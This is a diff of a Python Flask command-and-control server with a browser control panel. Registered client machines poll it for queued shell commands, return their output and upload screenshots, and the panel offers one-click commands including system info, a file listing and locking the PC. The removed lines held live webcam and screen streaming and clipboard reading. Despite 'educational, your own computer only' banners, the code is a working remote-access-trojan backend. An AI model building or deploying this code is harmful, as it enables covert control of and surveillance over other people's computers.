@@ -1,85 +1,86 @@
 #!/usr/bin/env python3
 """
-🎯 CLOUD C2 SERVER - ZERO ERROR VERSION
+🎯 EDUCATIONAL C2 SERVER - CLOUD VERSION
+⚠️  ONLY for YOUR OWN computer!
 """
-from flask import Flask, request, jsonify, render_template_string, Response
+
+from flask import Flask, request, jsonify, render_template_string
 import json
 import datetime
-import base64
-import time
 import os
 
 app = Flask(__name__)
+PASSWORD = "sasuke_lab_2026"
 
 clients = {}
 commands = {}
 results = {}
-camera_streams = {}
-screen_streams = {}
+screenshots = {}
 
 @app.route('/register', methods=['POST'])
 def register():
-    data = request.get_json()
-    client_id = data.get('client_id')
-    if client_id:
-        clients[client_id] = {
-            'id': client_id,
-            'hostname': data.get('hostname'),
-            'os': data.get('os'),
-            'last_seen': datetime.datetime.now().isoformat(),
-        }
-        return jsonify({'status': 'registered'})
-    return jsonify({'status': 'error'}), 400
+    try:
+        data = request.get_json()
+        client_id = data.get('client_id')
+        hostname = data.get('hostname')
+        os_info = data.get('os')
+        username = data.get('username')
+        if client_id:
+            clients[client_id] = {
+                'id': client_id,
+                'hostname': hostname,
+                'os': os_info,
+                'username': username,
+                'first_seen': datetime.datetime.now().isoformat(),
+                'last_seen': datetime.datetime.now().isoformat(),
+            }
+            return jsonify({'status': 'registered'})
+        return jsonify({'status': 'error'}), 400
+    except:
+        return jsonify({'status': 'error'}), 400
 
 @app.route('/get_command/<client_id>')
 def get_command(client_id):
     if client_id in clients:
         clients[client_id]['last_seen'] = datetime.datetime.now().isoformat()
         if client_id in commands and commands[client_id]:
-            return jsonify({'command': commands[client_id].pop(0)})
+            command = commands[client_id].pop(0)
+            return jsonify({'command': command})
     return jsonify({'command': None})
 
 @app.route('/send_result', methods=['POST'])
 def send_result():
-    data = request.get_json()
-    client_id = data.get('client_id')
-    if client_id not in results: results[client_id] = []
-    results[client_id].append({
-        'command': data.get('command'),
-        'output': data.get('output'),
-        'timestamp': datetime.datetime.now().isoformat()
-    })
-    return jsonify({'status': 'received'})
+    try:
+        data = request.get_json()
+        client_id = data.get('client_id')
+        output = data.get('output')
+        command = data.get('command')
+        if client_id not in results:
+            results[client_id] = []
+        results[client_id].append({
+            'command': command,
+            'output': output,
+            'timestamp': datetime.datetime.now().isoformat()
+        })
+        return jsonify({'status': 'received'})
+    except:
+        return jsonify({'status': 'error'}), 400
 
-@app.route('/stream_frame/<client_id>/<stream_type>', methods=['POST'])
-def stream_frame(client_id, stream_type):
-    data = request.get_json()
-    img_data = data.get('image')
-    if stream_type == 'camera':
-        camera_streams[client_id] = img_data
-    elif stream_type == 'screen':
-        screen_streams[client_id] = img_data
-    return jsonify({'status': 'ok'})
-
-@app.route('/api/camera_feed/<client_id>')
-def camera_feed(client_id):
-    def generate():
-        while True:
-            img = camera_streams.get(client_id)
-            if img:
-                yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + base64.b64decode(img) + b'\r\n')
-            time.sleep(0.1)
-    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
-
-@app.route('/api/screen_feed/<client_id>')
-def screen_feed(client_id):
-    def generate():
-        while True:
-            img = screen_streams.get(client_id)
-            if img:
-                yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + base64.b64decode(img) + b'\r\n')
-            time.sleep(0.1)
-    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
+@app.route('/upload_screenshot', methods=['POST'])
+def upload_screenshot():
+    try:
+        data = request.get_json()
+        client_id = data.get('client_id')
+        image_data = data.get('image')
+        if client_id and image_data:
+            screenshots[client_id] = {
+                'image': image_data,
+                'timestamp': datetime.datetime.now().isoformat()
+            }
+            return jsonify({'status': 'uploaded'})
+        return jsonify({'status': 'error'}), 400
+    except:
+        return jsonify({'status': 'error'}), 400
 
 @app.route('/')
 def index():
@@ -87,7 +88,7 @@ def index():
     <!DOCTYPE html>
     <html>
     <head>
-        <title>🎯 Cloud Control Panel</title>
+        <title>🎯 Remote Control Panel</title>
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -97,107 +98,98 @@ def index():
             .warning { background: #1a0000; border: 1px solid #ff4444; color: #ff4444; padding: 10px; border-radius: 6px; margin-bottom: 15px; font-size: 12px; }
             .card { background: #1a2332; padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #1f2937; }
             .card h3 { color: #00d4ff; margin-bottom: 10px; font-size: 14px; }
-            .client-card { background: #0f1622; padding: 12px; border-radius: 8px; border: 1px solid #1f2937; cursor: pointer; margin-bottom: 10px; }
+            .client-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 10px; }
+            .client-card { background: #0f1622; padding: 12px; border-radius: 8px; border: 1px solid #1f2937; cursor: pointer; transition: 0.3s; }
             .client-card:hover { border-color: #00d4ff; }
+            .client-card.selected { border-color: #22c55e; background: #0f2a1a; }
+            .client-card .name { color: #00d4ff; font-size: 14px; margin-bottom: 5px; }
+            .client-card .info { font-size: 11px; color: #6b7280; }
             .status-online { color: #22c55e; }
+            .status-offline { color: #ff4444; }
             .command-row { display: flex; gap: 10px; margin: 10px 0; }
             .command-row input { flex: 1; padding: 10px; background: #0a0a0a; border: 1px solid #333; color: #0f0; border-radius: 4px; font-family: monospace; }
             .command-row button { padding: 10px 20px; background: #00d4ff; color: #000; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
+            .command-row button:hover { background: #0099cc; }
+            .output { background: #0a0a0a; padding: 12px; border-radius: 6px; font-size: 12px; max-height: 300px; overflow-y: auto; border: 1px solid #333; white-space: pre-wrap; word-break: break-all; margin-top: 10px; font-family: monospace; }
+            .screenshot-container { background: #0a0a0a; padding: 10px; border-radius: 6px; margin-top: 10px; text-align: center; }
+            .screenshot-container img { max-width: 100%; max-height: 400px; border-radius: 4px; }
             .btn-row { display: flex; gap: 8px; flex-wrap: wrap; margin: 10px 0; }
             .btn { padding: 6px 12px; background: #1f2937; color: #e0e0e0; border: 1px solid #374151; border-radius: 4px; cursor: pointer; font-size: 11px; }
             .btn:hover { background: #374151; border-color: #00d4ff; }
             .btn-primary { background: #00d4ff; color: #000; border-color: #00d4ff; }
-            .output { background: #0a0a0a; padding: 12px; border-radius: 6px; font-size: 12px; max-height: 200px; overflow-y: auto; border: 1px solid #333; white-space: pre-wrap; margin-top: 10px; }
-            .stream-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-            .stream-box { background: #000; border-radius: 6px; min-height: 250px; display: flex; align-items: center; justify-content: center; border: 1px solid #333; }
-            .stream-box img { width: 100%; max-height: 400px; object-fit: contain; }
+            .btn-primary:hover { background: #0099cc; }
+            .btn-danger { background: #ff4444; color: #fff; border-color: #ff4444; }
             .no-client { color: #6b7280; text-align: center; padding: 20px; }
             .footer { color: #6b7280; font-size: 11px; text-align: center; margin-top: 20px; padding-top: 15px; border-top: 1px solid #1f2937; }
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>🎯 Cloud Control Panel</h1>
-            <div class="warning">⚠️ YOUR OWN DEVICE ONLY. Educational.</div>
-            
+            <h1>🎯 Remote Control Panel</h1>
+            <div class="warning">⚠️ ONLY for YOUR OWN computer! Educational purposes only.</div>
             <div class="card">
                 <h3>💻 Your Computers</h3>
-                <div id="clients"><div class="no-client">Loading...</div></div>
+                <div id="clients" class="client-grid"><div class="no-client">Loading...</div></div>
             </div>
-            
-            <div class="card" id="mainPanel" style="display:none;">
+            <div class="card" id="commandPanel" style="display:none;">
                 <h3>💀 Commands</h3>
+                <div style="font-size:12px;color:#6b7280;margin-bottom:10px;">
+                    Selected: <span id="selectedClient" style="color:#22c55e;">None</span>
+                </div>
                 <div class="command-row">
-                    <input type="text" id="commandInput" placeholder="Enter command..." />
+                    <input type="text" id="commandInput" placeholder="Enter command (e.g., whoami, dir, ipconfig)" />
                     <button onclick="sendCommand()">▶ Execute</button>
                 </div>
                 <div class="btn-row">
                     <button class="btn" onclick="quickCommand('whoami')">👤 Whoami</button>
                     <button class="btn" onclick="quickCommand('ipconfig')">🌐 IP Config</button>
-                    <button class="btn btn-primary" onclick="quickCommand('clipboard')">📋 Read Clipboard</button>
-                    <button class="btn btn-primary" onclick="showTTS()">🔊 Text to Speech</button>
+                    <button class="btn" onclick="quickCommand('dir C:\\\\')">📁 List Files</button>
+                    <button class="btn" onclick="quickCommand('systeminfo')">💻 System Info</button>
+                    <button class="btn btn-primary" onclick="quickCommand('screenshot')">📸 Screenshot</button>
+                    <button class="btn btn-danger" onclick="quickCommand('lock')">🔒 Lock PC</button>
                 </div>
-
-                <div id="ttsBox" style="display:none; margin-bottom: 10px;">
-                    <input type="text" id="ttsText" placeholder="Enter text for PC to speak..." style="width: 70%; padding: 8px; background: #000; color: #0f0; border: 1px solid #333;">
-                    <button class="btn btn-primary" onclick="sendTTS()">Speak</button>
-                </div>
-
-                <div id="output" class="output">Select a computer...</div>
-            </div>
-
-            <div class="card" id="streamsPanel" style="display:none;">
-                <h3>📷 Live Streams (Cloud)</h3>
-                <div class="stream-grid">
-                    <div>
-                        <div style="color:#6b7280; margin-bottom:5px; font-size:12px;">Webcam:</div>
-                        <div class="stream-box"><img id="camFeed" src="" /></div>
-                    </div>
-                    <div>
-                        <div style="color:#6b7280; margin-bottom:5px; font-size:12px;">Screen:</div>
-                        <div class="stream-box"><img id="screenFeed" src="" /></div>
-                    </div>
+                <div id="output" class="output">Select a computer and send a command...</div>
+                <div id="screenshot" class="screenshot-container" style="display:none;">
+                    <img id="screenshotImg" src="" alt="Screenshot" />
                 </div>
             </div>
-            
-            <div class="footer">⚠️ Educational Lab Only</div>
+            <div class="footer">⚠️ Educational Lab Only — Your own devices only</div>
         </div>
-        
         <script>
             let selectedClient = null;
             function refreshClients() {
                 fetch('/api/clients').then(r => r.json()).then(data => {
                     const container = document.getElementById('clients');
                     if (data.length === 0) {
-                        container.innerHTML = '<div class="no-client">No computers connected. Run client.py.</div>';
+                        container.innerHTML = '<div class="no-client">No computers connected. Run the client on YOUR PC.</div>';
                         return;
                     }
                     container.innerHTML = data.map(c => `
-                        <div class="client-card ${selectedClient === c.id ? 'selected' : ''}" onclick="selectClient('${c.id}')">
-                            <div style="color:#00d4ff; font-weight:bold;">🖥️ ${c.hostname}</div>
-                            <div style="font-size:11px; color:#6b7280;">Status: <span class="status-online">🟢 Online</span></div>
+                        <div class="client-card ${selectedClient === c.id ? 'selected' : ''}" onclick="selectClient('${c.id}', '${c.hostname}')">
+                            <div class="name">🖥️ ${c.hostname || c.id}</div>
+                            <div class="info">${c.os || 'Unknown'} | User: ${c.username || 'Unknown'}</div>
+                            <div class="info ${c.status === 'online' ? 'status-online' : 'status-offline'}">${c.status === 'online' ? '🟢 Online' : '🔴 Offline'}</div>
+                            <div class="info" style="font-size:10px;">Last seen: ${c.last_seen || 'Never'}</div>
                         </div>
                     `).join('');
                 });
             }
-            function selectClient(id) {
+            function selectClient(id, hostname) {
                 selectedClient = id;
-                document.getElementById('mainPanel').style.display = 'block';
-                document.getElementById('streamsPanel').style.display = 'block';
-                document.getElementById('camFeed').src = `/api/camera_feed/${id}`;
-                document.getElementById('screenFeed').src = `/api/screen_feed/${id}`;
+                document.getElementById('selectedClient').textContent = hostname || id;
+                document.getElementById('commandPanel').style.display = 'block';
                 refreshClients();
                 fetchResults();
             }
             function sendCommand() {
                 const command = document.getElementById('commandInput').value;
-                if (!command || !selectedClient) return alert('Select a PC and enter command');
+                if (!command || !selectedClient) { alert('Select a computer and enter a command'); return; }
                 fetch('/api/command', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ client_id: selectedClient, command: command })
-                }).then(() => {
-                    document.getElementById('output').textContent = `⏳ Sent: ${command}`;
+                }).then(r => r.json()).then(data => {
+                    document.getElementById('output').textContent = `⏳ Command sent: ${command}\nWaiting for result...`;
                     document.getElementById('commandInput').value = '';
                     setTimeout(fetchResults, 2000);
                 });
@@ -206,20 +198,18 @@ def index():
                 document.getElementById('commandInput').value = cmd;
                 sendCommand();
             }
-            function showTTS() { document.getElementById('ttsBox').style.display = 'block'; }
-            function sendTTS() {
-                const text = document.getElementById('ttsText').value;
-                if (!text) return;
-                quickCommand('tts:' + text);
-                document.getElementById('ttsText').value = '';
-                document.getElementById('ttsBox').style.display = 'none';
-            }
             function fetchResults() {
                 if (!selectedClient) return;
                 fetch(`/api/results/${selectedClient}`).then(r => r.json()).then(data => {
                     if (data.length > 0) {
                         const last = data[data.length - 1];
-                        document.getElementById('output').textContent = `📥 ${last.command}\n\n${last.output}`;
+                        document.getElementById('output').textContent = `📥 Command: ${last.command}\n\n${last.output}`;
+                    }
+                });
+                fetch(`/api/screenshot/${selectedClient}`).then(r => r.json()).then(data => {
+                    if (data.image) {
+                        document.getElementById('screenshot').style.display = 'block';
+                        document.getElementById('screenshotImg').src = 'data:image/png;base64,' + data.image;
                     }
                 });
             }
@@ -233,16 +223,45 @@ def index():
 
 @app.route('/api/clients')
 def api_clients():
-    return jsonify(list(clients.values()))
+    client_list = []
+    for c in clients.values():
+        if 'last_seen' in c:
+            try:
+                last = datetime.datetime.fromisoformat(c['last_seen'])
+                if (datetime.datetime.now() - last).total_seconds() < 60:
+                    c['status'] = 'online'
+                else:
+                    c['status'] = 'offline'
+            except:
+                c['status'] = 'unknown'
+        client_list.append(c)
+    return jsonify(client_list)
 
 @app.route('/api/command', methods=['POST'])
 def api_command():
-    data = request.get_json()
-    cid = data.get('client_id')
-    if cid not in commands: commands[cid] = []
-    commands[cid].append(data.get('command'))
-    return jsonify({'status': 'queued'})
+    try:
+        data = request.get_json()
+        client_id = data.get('client_id')
+        command = data.get('command')
+        if client_id not in commands:
+            commands[client_id] = []
+        commands[client_id].append(command)
+        return jsonify({'status': 'queued'})
+    except:
+        return jsonify({'status': 'error'}), 400
 
 @app.route('/api/results/<client_id>')
 def api_results(client_id):
-    return jsonify(results.get(client_id, [])[-5:])
+    if client_id in results:
+        return jsonify(results[client_id][-10:])
+    return jsonify([])
+
+@app.route('/api/screenshot/<client_id>')
+def api_screenshot(client_id):
+    if client_id in screenshots:
+        return jsonify(screenshots[client_id])
+    return jsonify({})
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
